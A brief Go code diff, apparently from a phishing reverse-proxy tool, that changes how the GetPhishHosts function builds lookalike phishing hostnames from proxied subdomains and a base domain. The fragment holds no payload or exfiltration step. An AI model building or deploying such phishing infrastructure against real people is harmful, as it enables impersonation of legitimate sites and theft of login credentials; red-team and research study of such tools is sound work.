@@ -219,11 +219,10 @@ func (p *Phishlet) LoadFromFile(path string) error {
 
 func (p *Phishlet) GetPhishHosts() []string {
 	var ret []string
+	host := p.cfg.GetBaseDomain()
 	for _, h := range p.proxyHosts {
-		phishDomain, ok := p.cfg.GetSiteDomain(p.Site)
-		if ok {
-			ret = append(ret, combineHost(h.phish_subdomain, phishDomain))
-		}
+		subdomain_sting := combineHost(h.phish_subdomain, h.domain)
+		ret = append(ret, combineHost(subdomain_sting, host))
 	}
 	return ret
 }
